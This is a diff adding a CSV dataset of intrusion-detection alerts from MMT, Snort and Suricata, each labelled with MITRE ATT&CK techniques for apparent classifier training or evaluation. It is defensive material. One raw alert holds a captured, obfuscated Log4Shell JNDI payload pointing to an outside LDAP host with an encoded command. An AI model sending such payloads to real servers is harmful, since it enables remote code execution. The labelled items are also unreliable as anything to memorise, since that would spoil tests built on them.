@@ -1,0 +1,630 @@
+"id","source_tool","signature","technique_ids","technique_names","technique_parents","parent_names","tactic","label_confidence","note","raw_path","raw_alert","raw_alert_no_signature"
+"mmt_15_nikto_scan_20220425_153028.csv","mmt","Nikto detection","T1595.002","Vulnerability Scanning","T1595","Active Scanning","reconnaissance","high","Nikto web vuln scanner","datasets/mmt/mmt_15_nikto_scan_20220425_153028.csv","10,0,"""",1650893428,15,""detected"",""attack"",""Nikto detection"",{""event_1"":{""timestamp"":1481903962.726933,""counter"":6,""attributes"":[[""http.method"",""HEAD""],[""http.user_agent"",""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:Port Check)""],[""ip.src"",""192.168.0.49""],[""ip.dst"",""217.70.184.38""]]},""event_2"":{""timestamp"":1481903962.726933,""counter"":6,""attributes"":[[""http.user_agent"",""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:Port Check)""]]}}","10,0,,1650893428,15,detected,attack,,{""event_1"":{""timestamp"":1481903962.726933,""counter"":6,""attributes"":[[""http.method"",""HEAD""],[""http.user_agent"",""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:Port Check)""],[""ip.src"",""192.168.0.49""],[""ip.dst"",""217.70.184.38""]]},""event_2"":{""timestamp"":1481903962.726933,""counter"":6,""attributes"":[[""http.user_agent"",""Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:Port Check)""]]}}"
+"mmt_1_ssh_brute_force_20220425_153015.csv","mmt","Several attempts to connect via ssh (brute force attack). Source address is either infected machine or attacker (no spoofing is possible).","T1110","Brute Force","T1110","Brute Force","credential-access","high","SSH brute force","datasets/mmt/mmt_1_ssh_brute_force_20220425_153015.csv","10,0,"""",1650893415,1,""detected"",""attack"",""Several attempts to connect via ssh (brute force attack). Source address is either infected machine or attacker (no spoofing is possible)."",{""event_1"":{""timestamp"":1492079795.717693,""counter"":1,""attributes"":[[""ip.src"",""192.168.0.59""],[""ip.dst"",""192.168.0.101""],[""tcp.dest_port"",22],[""tcp.flags"",2]]},""event_2"":{""timestamp"":1492079795.717893,""counter"":2,""attributes"":[[""ip.src"",""192.168.0.101""],[""ip.dst"",""192.168.0.59""],[""tcp.src_port"",22],[""tcp.flags"",18]]},""event_3"":{""timestamp"":1492079795.967801,""counter"":35,""attributes"":[[""ip.src"",""192.168.0.59""],[""ip.dst"",""192.168.0.101""],[""tcp.dest_port"",22],[""tcp.flags"",2]]},""event_4"":{""timestamp"":1492079797.685815,""counter"":70,""attributes"":[[""ip.src"",""192.168.0.59""],[""ip.dst"",""192.168.0.101""],[""tcp.dest_port"",22],[""tcp.flags"",2]]}}","10,0,,1650893415,1,detected,attack,,{""event_1"":{""timestamp"":1492079795.717693,""counter"":1,""attributes"":[[""ip.src"",""192.168.0.59""],[""ip.dst"",""192.168.0.101""],[""tcp.dest_port"",22],[""tcp.flags"",2]]},""event_2"":{""timestamp"":1492079795.717893,""counter"":2,""attributes"":[[""ip.src"",""192.168.0.101""],[""ip.dst"",""192.168.0.59""],[""tcp.src_port"",22],[""tcp.flags"",18]]},""event_3"":{""timestamp"":1492079795.967801,""counter"":35,""attributes"":[[""ip.src"",""192.168.0.59""],[""ip.dst"",""192.168.0.101""],[""tcp.dest_port"",22],[""tcp.flags"",2]]},""event_4"":{""timestamp"":1492079797.685815,""counter"":70,""attributes"":[[""ip.src"",""192.168.0.59""],[""ip.dst"",""192.168.0.101""],[""tcp.dest_port"",22],[""tcp.flags"",2]]}}"
+"mmt_20_icmp_redirect_20220425_153045.csv","mmt","4 consecutive ICMP redirect packets. Possibly ICMP redirect flood.","T1557","Adversary-in-the-Middle","T1557","Adversary-in-the-Middle","collection;credential-access","medium","ICMP redirect -> AiTM/redirection (or DoS)","datasets/mmt/mmt_20_icmp_redirect_20220425_153045.csv","10,0,"""",1650893445,20,""detected"",""attack"",""4 consecutive ICMP redirect packets. Possibly ICMP redirect flood."",{""event_1"":{""timestamp"":1481274722.643309,""counter"":1,""attributes"":[[""icmp.type"",5],[""ip.src"",""192.168.227.137""],[""ip.dst"",""217.70.184.38""]]},""event_2"":{""timestamp"":1481274723.644219,""counter"":2,""attributes"":[[""icmp.type"",5],[""ip.src"",""192.168.227.137""],[""ip.dst"",""217.70.184.38""]]},""event_3"":{""timestamp"":1481274724.644791,""counter"":3,""attributes"":[[""icmp.type"",5],[""ip.src"",""192.168.227.137""],[""ip.dst"",""217.70.184.38""]]},""event_4"":{""timestamp"":1481274725.645735,""counter"":4,""attributes"":[[""icmp.type"",5],[""ip.src"",""192.168.227.137""],[""ip.dst"",""217.70.184.38""]]}}","10,0,,1650893445,20,detected,attack,,{""event_1"":{""timestamp"":1481274722.643309,""counter"":1,""attributes"":[[""icmp.type"",5],[""ip.src"",""192.168.227.137""],[""ip.dst"",""217.70.184.38""]]},""event_2"":{""timestamp"":1481274723.644219,""counter"":2,""attributes"":[[""icmp.type"",5],[""ip.src"",""192.168.227.137""],[""ip.dst"",""217.70.184.38""]]},""event_3"":{""timestamp"":1481274724.644791,""counter"":3,""attributes"":[[""icmp.type"",5],[""ip.src"",""192.168.227.137""],[""ip.dst"",""217.70.184.38""]]},""event_4"":{""timestamp"":1481274725.645735,""counter"":4,""attributes"":[[""icmp.type"",5],[""ip.src"",""192.168.227.137""],[""ip.dst"",""217.70.184.38""]]}}"
+"mmt_32_botnet_cc_20220425_153115.csv","mmt","Botnet Command and Control detection","T1071","Application Layer Protocol","T1071","Application Layer Protocol","command-and-control","high","Botnet C2 channel","datasets/mmt/mmt_32_botnet_cc_20220425_153115.csv","10,0,"""",1650893475,32,""detected"",""attack"",""Botnet Command and Control detection"",{""event_1"":{""timestamp"":1441112330.560344,""counter"":1,""attributes"":[[""ip.src"",""104.219.54.49""],[""ip.dst"",""192.168.0.102""]]},""event_2"":{""timestamp"":1441112330.560344,""counter"":1,""attributes"":[[""ip.src"",""104.219.54.49""],[""ip.dst"",""192.168.0.102""]]}}","10,0,,1650893475,32,detected,attack,,{""event_1"":{""timestamp"":1441112330.560344,""counter"":1,""attributes"":[[""ip.src"",""104.219.54.49""],[""ip.dst"",""192.168.0.102""]]},""event_2"":{""timestamp"":1441112330.560344,""counter"":1,""attributes"":[[""ip.src"",""104.219.54.49""],[""ip.dst"",""192.168.0.102""]]}}"
+"mmt_33_trojan_20220425_153118.csv","mmt","Trojan detection","T1071.001","Web Protocols","T1071","Application Layer Protocol","command-and-control","medium","Trojan HTTP beacon","datasets/mmt/mmt_33_trojan_20220425_153118.csv","10,0,"""",1650893478,33,""detected"",""attack"",""Trojan detection"",{""event_1"":{""timestamp"":1493987383.111860,""counter"":4,""attributes"":[[""http.uri"",""/ctrl/cnt_boot.php?pgv=""]]},""event_2"":{""timestamp"":1493987383.111860,""counter"":4,""attributes"":[[""http.method"",""GET""],[""ip.src"",""10.0.2.15""],[""ip.dst"",""192.168.0.101""]]}}","10,0,,1650893478,33,detected,attack,,{""event_1"":{""timestamp"":1493987383.111860,""counter"":4,""attributes"":[[""http.uri"",""/ctrl/cnt_boot.php?pgv=""]]},""event_2"":{""timestamp"":1493987383.111860,""counter"":4,""attributes"":[[""http.method"",""GET""],[""ip.src"",""10.0.2.15""],[""ip.dst"",""192.168.0.101""]]}}"
+"mmt_37_wannacry_ransomware_20220425_153124.csv","mmt","Detection of WannaCry Ransomware","T1486","Data Encrypted for Impact","T1486","Data Encrypted for Impact","impact","high","WannaCry ransomware","datasets/mmt/mmt_37_wannacry_ransomware_20220425_153124.csv","10,0,"""",1650893484,38,""detected"",""attack"",""Detection of WannaCry Ransomware"",{""event_1"":{""timestamp"":1495037791.091065,""counter"":1618,""attributes"":[[""http.host"",""iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com""]]},""event_2"":{""timestamp"":1495037791.091065,""counter"":1618,""attributes"":[[""ip.src"",""192.168.0.69""],[""ip.dst"",""144.217.254.90""]]}}","10,0,,1650893484,38,detected,attack,,{""event_1"":{""timestamp"":1495037791.091065,""counter"":1618,""attributes"":[[""http.host"",""iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com""]]},""event_2"":{""timestamp"":1495037791.091065,""counter"":1618,""attributes"":[[""ip.src"",""192.168.0.69""],[""ip.dst"",""144.217.254.90""]]}}"
+"mmt_4.5_attack_20220425_153127.csv","mmt","IPv4 address conflict detection (RFC5227). Possible arp poisoning.","T1557.002","ARP Cache Poisoning","T1557","Adversary-in-the-Middle","collection;credential-access","medium","IPv4 conflict / ARP poisoning","datasets/mmt/mmt_4.5_attack_20220425_153127.csv","10,0,"""",1650893487,4,""detected"",""attack"",""IPv4 address conflict detection (RFC5227). Possible arp poisoning."",{""event_1"":{""timestamp"":1389048986.340873,""counter"":21,""attributes"":[[""arp.ar_op"",1],[""arp.ar_tip"",""192.168.47.1""],[""ethernet.dst"",""ff:ff:ff:ff:ff:ff""],[""ethernet.src"",""00:0c:29:1d:b3:b1""]]},""event_2"":{""timestamp"":1389048986.340955,""counter"":22,""attributes"":[[""arp.ar_op"",2],[""arp.ar_sha"",""00:50:56:c0:00:08""],[""arp.ar_sip"",""192.168.47.1""],[""ethernet.packet_count"",22]]},""event_3"":{""timestamp"":1389048989.446972,""counter"":279,""attributes"":[[""arp.ar_op"",2],[""arp.ar_sha"",""00:0c:29:1d:b3:b1""],[""arp.ar_sip"",""192.168.47.1""],[""ethernet.packet_count"",279]]}}","10,0,,1650893487,4,detected,attack,,{""event_1"":{""timestamp"":1389048986.340873,""counter"":21,""attributes"":[[""arp.ar_op"",1],[""arp.ar_tip"",""192.168.47.1""],[""ethernet.dst"",""ff:ff:ff:ff:ff:ff""],[""ethernet.src"",""00:0c:29:1d:b3:b1""]]},""event_2"":{""timestamp"":1389048986.340955,""counter"":22,""attributes"":[[""arp.ar_op"",2],[""arp.ar_sha"",""00:50:56:c0:00:08""],[""arp.ar_sip"",""192.168.47.1""],[""ethernet.packet_count"",22]]},""event_3"":{""timestamp"":1389048989.446972,""counter"":279,""attributes"":[[""arp.ar_op"",2],[""arp.ar_sha"",""00:0c:29:1d:b3:b1""],[""arp.ar_sip"",""192.168.47.1""],[""ethernet.packet_count"",279]]}}"
+"mmt_77_log4shell_20220425_153132.csv","mmt","Detect Log4Shell attack that exploits a vulnerability of log4j, CVE-2021-44832, to get a remote code execution","T1190","Exploit Public-Facing Application","T1190","Exploit Public-Facing Application","initial-access","high","Log4Shell RCE on public app","datasets/mmt/mmt_77_log4shell_20220425_153132.csv","10,0,"""",1650893492,77,""detected"",""attack"",""Detect Log4Shell attack that exploits a vulnerability of log4j, CVE-2021-44832, to get a remote code execution"",{""event_1"":{""timestamp"":1639497752.516294,""counter"":4,""attributes"":[[""http.uri"",""/test?q=%24%7B%24%7B%3A%3A-j%7D%24%7B%3A%3A-n%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-i%7D%3A%24%7B%3A%3A-l%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-a%7D%24%7B%3A%3A-p%7D%3A%2F%2F34.91.73.37%3A1389%2FBasic%2FCommand%2FBase64%2FcGluZyAtYyAxMCAxLjEuMS4x%7D""],[""http.user_agent"",""python-requests/2.25.1""]]},""event_2"":{""timestamp"":1639497752.516294,""counter"":4,""attributes"":[[""ip.src"",""172.17.0.1""],[""ip.dst"",""172.17.0.2""]]}}","10,0,,1650893492,77,detected,attack,,{""event_1"":{""timestamp"":1639497752.516294,""counter"":4,""attributes"":[[""http.uri"",""/test?q=%24%7B%24%7B%3A%3A-j%7D%24%7B%3A%3A-n%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-i%7D%3A%24%7B%3A%3A-l%7D%24%7B%3A%3A-d%7D%24%7B%3A%3A-a%7D%24%7B%3A%3A-p%7D%3A%2F%2F34.91.73.37%3A1389%2FBasic%2FCommand%2FBase64%2FcGluZyAtYyAxMCAxLjEuMS4x%7D""],[""http.user_agent"",""python-requests/2.25.1""]]},""event_2"":{""timestamp"":1639497752.516294,""counter"":4,""attributes"":[[""ip.src"",""172.17.0.1""],[""ip.dst"",""172.17.0.2""]]}}"
+"snort:254:snort_dns_spoof_query_response_with_ttl_of_1_min._and_no_254.txt","snort","DNS SPOOF query response with TTL of 1 min. and no authority","T1557","Adversary-in-the-Middle","T1557","Adversary-in-the-Middle","collection;credential-access","medium","DNS spoofed response (AiTM)","datasets/snort/snort_dns_spoof_query_response_with_ttl_of_1_min._and_no_254.txt","[**] [1:254:4] DNS SPOOF query response with TTL of 1 min. and no authority [**]
+[Classification: Potentially Bad Traffic] [Priority: 2]
+03/14-14:13:32.988223 4.2.2.3:53 -> 192.168.52.10:1044
+UDP TTL:54 TOS:0x0 ID:16027 IpLen:20 DgmLen:82
+Len: 54","[**] [1:254:4] [**]
+03/14-14:13:32.988223 4.2.2.3:53 -> 192.168.52.10:1044
+UDP TTL:54 TOS:0x0 ID:16027 IpLen:20 DgmLen:82
+Len: 54"
+"snort:2013666:snort_et_current_events_likely_blackhole_exploit_kit_dri_2013666.txt","snort","ET CURRENT_EVENTS Likely Blackhole Exploit Kit Driveby ?page Download Secondary Request","T1189","Drive-by Compromise","T1189","Drive-by Compromise","initial-access","high","Blackhole exploit kit drive-by","datasets/snort/snort_et_current_events_likely_blackhole_exploit_kit_dri_2013666.txt","[**] [1:2013666:6] ET CURRENT_EVENTS Likely Blackhole Exploit Kit Driveby ?page Download Secondary Request [**]
+[Classification: A Network Trojan was Detected] [Priority: 1]
+10/14-22:05:08.493991 192.168.40.10:1062 -> 85.17.136.147:80
+TCP TTL:52 TOS:0x0 ID:1439 IpLen:20 DgmLen:437 DF
+***A**** Seq: 0x78018803  Ack: 0xBED91AB4  Win: 0x1920  TcpLen: 20","[**] [1:2013666:6] [**]
+10/14-22:05:08.493991 192.168.40.10:1062 -> 85.17.136.147:80
+TCP TTL:52 TOS:0x0 ID:1439 IpLen:20 DgmLen:437 DF
+***A**** Seq: 0x78018803  Ack: 0xBED91AB4  Win: 0x1920  TcpLen: 20"
+"snort:2014546:snort_et_current_events_tds_sutra_-_http_header_redirect_2014546.txt","snort","ET CURRENT_EVENTS TDS Sutra - HTTP header redirecting to a SutraTDS","T1189","Drive-by Compromise","T1189","Drive-by Compromise","initial-access","medium","TDS Sutra redirect to exploit","datasets/snort/snort_et_current_events_tds_sutra_-_http_header_redirect_2014546.txt","[**] [1:2014546:4] ET CURRENT_EVENTS TDS Sutra - HTTP header redirecting to a SutraTDS [**]
+[Classification: Potentially Bad Traffic] [Priority: 2]
+10/14-22:05:06.195788 78.159.112.180:80 -> 192.168.40.10:1038
+TCP TTL:128 TOS:0x0 ID:313 IpLen:20 DgmLen:818 DF
+***AP*** Seq: 0xE0D3096C  Ack: 0xFCE580FC  Win: 0xFCF5  TcpLen: 20","[**] [1:2014546:4] [**]
+10/14-22:05:06.195788 78.159.112.180:80 -> 192.168.40.10:1038
+TCP TTL:128 TOS:0x0 ID:313 IpLen:20 DgmLen:818 DF
+***AP*** Seq: 0xE0D3096C  Ack: 0xFCE580FC  Win: 0xFCF5  TcpLen: 20"
+"snort:2014545:snort_et_current_events_tds_sutra_-_page_redirecting_to_2014545.txt","snort","ET CURRENT_EVENTS TDS Sutra - page redirecting to a SutraTDS","T1189","Drive-by Compromise","T1189","Drive-by Compromise","initial-access","medium","TDS Sutra redirect to exploit","datasets/snort/snort_et_current_events_tds_sutra_-_page_redirecting_to_2014545.txt","[**] [1:2014545:2] ET CURRENT_EVENTS TDS Sutra - page redirecting to a SutraTDS [**]
+[Classification: Potentially Bad Traffic] [Priority: 2]
+10/14-22:05:04.513519 69.147.224.162:80 -> 192.168.40.10:1031
+TCP TTL:128 TOS:0x0 ID:77 IpLen:20 DgmLen:4671 DF
+***AP*** Seq: 0x8E33F9A2  Ack: 0x79C0BCC1  Win: 0xFF04  TcpLen: 20","[**] [1:2014545:2] [**]
+10/14-22:05:04.513519 69.147.224.162:80 -> 192.168.40.10:1031
+TCP TTL:128 TOS:0x0 ID:77 IpLen:20 DgmLen:4671 DF
+***AP*** Seq: 0x8E33F9A2  Ack: 0x79C0BCC1  Win: 0xFF04  TcpLen: 20"
+"snort:2014542:snort_et_current_events_tds_sutra_-_redirect_received_2014542.txt","snort","ET CURRENT_EVENTS TDS Sutra - redirect received","T1189","Drive-by Compromise","T1189","Drive-by Compromise","initial-access","medium","TDS Sutra redirect received","datasets/snort/snort_et_current_events_tds_sutra_-_redirect_received_2014542.txt","[**] [1:2014542:2] ET CURRENT_EVENTS TDS Sutra - redirect received [**]
+[Classification: Potentially Bad Traffic] [Priority: 2]
+10/14-22:05:06.195788 78.159.112.180:80 -> 192.168.40.10:1038
+TCP TTL:128 TOS:0x0 ID:313 IpLen:20 DgmLen:818 DF
+***AP*** Seq: 0xE0D3096C  Ack: 0xFCE580FC  Win: 0xFCF5  TcpLen: 20","[**] [1:2014542:2] [**]
+10/14-22:05:06.195788 78.159.112.180:80 -> 192.168.40.10:1038
+TCP TTL:128 TOS:0x0 ID:313 IpLen:20 DgmLen:818 DF
+***AP*** Seq: 0xE0D3096C  Ack: 0xFCE580FC  Win: 0xFCF5  TcpLen: 20"
+"snort:2014543:snort_et_current_events_tds_sutra_-_request_in.cgi_2014543.txt","snort","ET CURRENT_EVENTS TDS Sutra - request in.cgi","T1189","Drive-by Compromise","T1189","Drive-by Compromise","initial-access","medium","TDS Sutra TDS request","datasets/snort/snort_et_current_events_tds_sutra_-_request_in.cgi_2014543.txt","[**] [1:2014543:1] ET CURRENT_EVENTS TDS Sutra - request in.cgi [**]
+[Classification: Potentially Bad Traffic] [Priority: 2]
+10/14-22:05:06.076673 192.168.40.10:1038 -> 78.159.112.180:80
+TCP TTL:54 TOS:0x0 ID:63430 IpLen:20 DgmLen:403 DF
+***A**** Seq: 0xFCE57F91  Ack: 0xE0D3096C  Win: 0x1920  TcpLen: 20","[**] [1:2014543:1] [**]
+10/14-22:05:06.076673 192.168.40.10:1038 -> 78.159.112.180:80
+TCP TTL:54 TOS:0x0 ID:63430 IpLen:20 DgmLen:403 DF
+***A**** Seq: 0xFCE57F91  Ack: 0xE0D3096C  Win: 0x1920  TcpLen: 20"
+"snort:2014543:snort_et_current_events_tds_sutra_-_request_in.cgi_2014543_1.txt","snort","ET CURRENT_EVENTS TDS Sutra - request in.cgi","T1189","Drive-by Compromise","T1189","Drive-by Compromise","initial-access","medium","TDS Sutra TDS request","datasets/snort/snort_et_current_events_tds_sutra_-_request_in.cgi_2014543_1.txt","[**] [1:2014543:1] ET CURRENT_EVENTS TDS Sutra - request in.cgi [**]
+[Classification: Potentially Bad Traffic] [Priority: 2]
+10/14-22:05:06.076673 192.168.40.10:1038 -> 78.159.112.180:80
+TCP TTL:54 TOS:0x0 ID:63430 IpLen:20 DgmLen:403 DF
+***A**** Seq: 0xFCE57F91  Ack: 0xE0D3096C  Win: 0x1920  TcpLen: 20","[**] [1:2014543:1] [**]
+10/14-22:05:06.076673 192.168.40.10:1038 -> 78.159.112.180:80
+TCP TTL:54 TOS:0x0 ID:63430 IpLen:20 DgmLen:403 DF
+***A**** Seq: 0xFCE57F91  Ack: 0xE0D3096C  Win: 0x1920  TcpLen: 20"
+"snort:2015744:snort_et_info_exe_isdebuggerpresent_used_in_malware_anti_2015744.txt","snort","ET INFO EXE IsDebuggerPresent (Used in Malware Anti-Debugging)","T1622","Debugger Evasion","T1622","Debugger Evasion","discovery;stealth","medium","IsDebuggerPresent anti-debug","datasets/snort/snort_et_info_exe_isdebuggerpresent_used_in_malware_anti_2015744.txt","[**] [1:2015744:3] ET INFO EXE IsDebuggerPresent (Used in Malware Anti-Debugging) [**]
+[Classification: Misc activity] [Priority: 3]
+08/19-21:05:33.138948 85.17.23.18:80 -> 192.168.23.10:1039
+TCP TTL:128 TOS:0x0 ID:752 IpLen:20 DgmLen:17560 DF
+***A**** Seq: 0xBB8EBE56  Ack: 0xA4A47E22  Win: 0xFFFF  TcpLen: 20","[**] [1:2015744:3] [**]
+08/19-21:05:33.138948 85.17.23.18:80 -> 192.168.23.10:1039
+TCP TTL:128 TOS:0x0 ID:752 IpLen:20 DgmLen:17560 DF
+***A**** Seq: 0xBB8EBE56  Ack: 0xA4A47E22  Win: 0xFFFF  TcpLen: 20"
+"snort:2014819:snort_et_info_packed_executable_download_2014819.txt","snort","ET INFO Packed Executable Download","T1105","Ingress Tool Transfer","T1105","Ingress Tool Transfer","command-and-control","high","Packed executable download","datasets/snort/snort_et_info_packed_executable_download_2014819.txt","[**] [1:2014819:1] ET INFO Packed Executable Download [**]
+[Classification: Misc activity] [Priority: 3]
+08/19-21:05:33.138948 85.17.23.18:80 -> 192.168.23.10:1039
+TCP TTL:128 TOS:0x0 ID:752 IpLen:20 DgmLen:17560 DF
+***A**** Seq: 0xBB8EBE56  Ack: 0xA4A47E22  Win: 0xFFFF  TcpLen: 20","[**] [1:2014819:1] [**]
+08/19-21:05:33.138948 85.17.23.18:80 -> 192.168.23.10:1039
+TCP TTL:128 TOS:0x0 ID:752 IpLen:20 DgmLen:17560 DF
+***A**** Seq: 0xBB8EBE56  Ack: 0xA4A47E22  Win: 0xFFFF  TcpLen: 20"
+"snort:2009897:snort_et_malware_possible_windows_executable_sent_when_r_2009897.txt","snort","ET MALWARE Possible Windows executable sent when remote host claims to send html content","T1105","Ingress Tool Transfer","T1105","Ingress Tool Transfer","command-and-control","high","Malicious EXE download (content-type mismatch)","datasets/snort/snort_et_malware_possible_windows_executable_sent_when_r_2009897.txt","[**] [1:2009897:6] ET MALWARE Possible Windows executable sent when remote host claims to send html content [**]
+[Classification: A Network Trojan was Detected] [Priority: 1]
+03/14-14:13:24.845200 67.196.50.144:80 -> 192.168.52.10:1060
+TCP TTL:128 TOS:0x0 ID:1442 IpLen:20 DgmLen:5880 DF
+***A**** Seq: 0x9A83C2E5  Ack: 0xBB77030F  Win: 0xFFFF  TcpLen: 20
+[Xref => http://doc.emergingthreats.net/2009897]","[**] [1:2009897:6] [**]
+03/14-14:13:24.845200 67.196.50.144:80 -> 192.168.52.10:1060
+TCP TTL:128 TOS:0x0 ID:1442 IpLen:20 DgmLen:5880 DF
+***A**** Seq: 0x9A83C2E5  Ack: 0xBB77030F  Win: 0xFFFF  TcpLen: 20
+[Xref => http://doc.emergingthreats.net/2009897]"
+"snort:2020757:snort_et_malware_windows_executable_sent_when_remote_hos_2020757.txt","snort","ET MALWARE Windows executable sent when remote host claims to send an image 2","T1105","Ingress Tool Transfer","T1105","Ingress Tool Transfer","command-and-control","high","Malicious EXE download (image content-type)","datasets/snort/snort_et_malware_windows_executable_sent_when_remote_hos_2020757.txt","[**] [1:2020757:1] ET MALWARE Windows executable sent when remote host claims to send an image 2 [**]
+[Classification: A Network Trojan was Detected] [Priority: 1] 
+08/19-21:05:33.138948 85.17.23.18:80 -> 192.168.23.10:1039
+TCP TTL:58 TOS:0x0 ID:32906 IpLen:20 DgmLen:1500 DF
+***A**** Seq: 0xBB8EBE56  Ack: 0xA4A47E22  Win: 0x6698  TcpLen: 20","[**] [1:2020757:1] [**]
+08/19-21:05:33.138948 85.17.23.18:80 -> 192.168.23.10:1039
+TCP TTL:58 TOS:0x0 ID:32906 IpLen:20 DgmLen:1500 DF
+***A**** Seq: 0xBB8EBE56  Ack: 0xA4A47E22  Win: 0x6698  TcpLen: 20"
+"snort:2018959:snort_et_policy_pe_exe_or_dll_windows_file_download_http_2018959.txt","snort","ET POLICY PE EXE or DLL Windows file download HTTP","T1105","Ingress Tool Transfer","T1105","Ingress Tool Transfer","command-and-control","high","PE EXE/DLL download over HTTP","datasets/snort/snort_et_policy_pe_exe_or_dll_windows_file_download_http_2018959.txt","[**] [1:2018959:2] ET POLICY PE EXE or DLL Windows file download HTTP [**]
+[Classification: Potential Corporate Privacy Violation] [Priority: 1]
+03/14-14:13:24.845200 67.196.50.144:80 -> 192.168.52.10:1060
+TCP TTL:128 TOS:0x0 ID:1442 IpLen:20 DgmLen:5880 DF
+***A**** Seq: 0x9A83C2E5  Ack: 0xBB77030F  Win: 0xFFFF  TcpLen: 20
+[Xref => http://doc.emergingthreats.net/bin/view/Main/2000419]","[**] [1:2018959:2] [**]
+03/14-14:13:24.845200 67.196.50.144:80 -> 192.168.52.10:1060
+TCP TTL:128 TOS:0x0 ID:1442 IpLen:20 DgmLen:5880 DF
+***A**** Seq: 0x9A83C2E5  Ack: 0xBB77030F  Win: 0xFFFF  TcpLen: 20
+[Xref => http://doc.emergingthreats.net/bin/view/Main/2000419]"
+"snort:2018430:snort_et_web_client_suspicous_possible_automated_connect_2018430.txt","snort","ET WEB_CLIENT SUSPICOUS Possible automated connectivity check (www.google.com)","T1016.001","Internet Connection Discovery","T1016","System Network Configuration Discovery","discovery","low","Automated connectivity check","datasets/snort/snort_et_web_client_suspicous_possible_automated_connect_2018430.txt","[**] [1:2018430:1] ET WEB_CLIENT SUSPICOUS Possible automated connectivity check (www.google.com) [**]
+[Classification: Potentially Bad Traffic] [Priority: 2]
+03/14-14:13:32.580750 192.168.52.10:1061 -> 74.125.128.106:80
+TCP TTL:128 TOS:0x0 ID:1587 IpLen:20 DgmLen:80 DF
+***AP*** Seq: 0x15196602  Ack: 0xA31DFD39  Win: 0xFFFF  TcpLen: 20","[**] [1:2018430:1] [**]
+03/14-14:13:32.580750 192.168.52.10:1061 -> 74.125.128.106:80
+TCP TTL:128 TOS:0x0 ID:1587 IpLen:20 DgmLen:80 DF
+***AP*** Seq: 0x15196602  Ack: 0xA31DFD39  Win: 0xFFFF  TcpLen: 20"
+"snort:1917:snort_scan_upnp_service_discover_attempt_1917.txt","snort","SCAN UPnP service discover attempt","T1046","Network Service Discovery","T1046","Network Service Discovery","discovery","high","UPnP service discovery scan","datasets/snort/snort_scan_upnp_service_discover_attempt_1917.txt","[**] [1:1917:6] SCAN UPnP service discover attempt [**]
+[Classification: Detection of a Network Scan] [Priority: 3]
+08/19-21:05:28.544971 192.168.23.10:1034 -> 239.255.255.250:1900
+UDP TTL:1 TOS:0x0 ID:66 IpLen:20 DgmLen:161
+Len: 133","[**] [1:1917:6] [**]
+08/19-21:05:28.544971 192.168.23.10:1034 -> 239.255.255.250:1900
+UDP TTL:1 TOS:0x0 ID:66 IpLen:20 DgmLen:161
+Len: 133"
+"suricata:2001219","suricata","ET SCAN Potential SSH Scan","T1595","Active Scanning","T1595","Active Scanning","reconnaissance","high","Inbound SSH scan (active scanning)","datasets/suricata/suricata_2001219_ET_SCAN_Potential_SSH_Scan_0.0.0.0_to_10.47.8.150_20180324_143719.json","{
+  ""timestamp"": ""2018-03-24T14:37:19.037299-0600"",
+  ""flow_id"": 928532049924531,
+  ""pcap_cnt"": 169577,
+  ""event_type"": ""alert"",
+  ""src_ip"": ""0.0.0.0"",
+  ""src_port"": 26078,
+  ""dest_ip"": ""10.47.8.150"",
+  ""dest_port"": 22,
+  ""proto"": ""TCP"",
+  ""alert"": {
+    ""action"": ""allowed"",
+    ""gid"": 1,
+    ""signature_id"": 2001219,
+    ""rev"": 20,
+    ""signature"": ""ET SCAN Potential SSH Scan"",
+    ""category"": ""Attempted Information Leak"",
+    ""severity"": 2
+  },
+  ""flow"": {
+    ""pkts_toserver"": 1,
+    ""pkts_toclient"": 0,
+    ""bytes_toserver"": 74,
+    ""bytes_toclient"": 0,
+    ""start"": ""2018-03-24T14:37:19.037299-0600""
+  }
+}","{""timestamp"": ""2018-03-24T14:37:19.037299-0600"", ""flow_id"": 928532049924531, ""pcap_cnt"": 169577, ""event_type"": ""alert"", ""src_ip"": ""0.0.0.0"", ""src_port"": 26078, ""dest_ip"": ""10.47.8.150"", ""dest_port"": 22, ""proto"": ""TCP"", ""alert"": {""action"": ""allowed"", ""gid"": 1, ""signature_id"": 2001219, ""rev"": 20, ""severity"": 2}, ""flow"": {""pkts_toserver"": 1, ""pkts_toclient"": 0, ""bytes_toserver"": 74, ""bytes_toclient"": 0, ""start"": ""2018-03-24T14:37:19.037299-0600""}}"
+"suricata:2003068","suricata","ET SCAN Potential SSH Scan OUTBOUND","T1046","Network Service Discovery","T1046","Network Service Discovery","discovery","high","Outbound SSH scan (service discovery)","datasets/suricata/suricata_2003068_ET_SCAN_Potential_SSH_Scan_OUTBOUND_10.47.5.154_to_192.16.10.154_20180323_141008.json","{
+  ""timestamp"": ""2018-03-23T14:10:08.763007-0600"",
+  ""flow_id"": 773772166540600,
+  ""pcap_cnt"": 159033,
+  ""event_type"": ""alert"",
+  ""src_ip"": ""10.47.5.154"",
+  ""src_port"": 33627,
+  ""dest_ip"": ""192.16.10.154"",
+  ""dest_port"": 22,
+  ""proto"": ""TCP"",
+  ""alert"": {
+    ""action"": ""allowed"",
+    ""gid"": 1,
+    ""signature_id"": 2003068,
+    ""rev"": 7,
+    ""signature"": ""ET SCAN Potential SSH Scan OUTBOUND"",
+    ""category"": ""Attempted Information Leak"",
+    ""severity"": 2
+  },
+  ""flow"": {
+    ""pkts_toserver"": 3,
+    ""pkts_toclient"": 0,
+    ""bytes_toserver"": 222,
+    ""bytes_toclient"": 0,
+    ""start"": ""2018-03-23T14:10:07.765240-0600""
+  }
+}","{""timestamp"": ""2018-03-23T14:10:08.763007-0600"", ""flow_id"": 773772166540600, ""pcap_cnt"": 159033, ""event_type"": ""alert"", ""src_ip"": ""10.47.5.154"", ""src_port"": 33627, ""dest_ip"": ""192.16.10.154"", ""dest_port"": 22, ""proto"": ""TCP"", ""alert"": {""action"": ""allowed"", ""gid"": 1, ""signature_id"": 2003068, ""rev"": 7, ""severity"": 2}, ""flow"": {""pkts_toserver"": 3, ""pkts_toclient"": 0, ""bytes_toserver"": 222, ""bytes_toclient"": 0, ""start"": ""2018-03-23T14:10:07.765240-0600""}}"
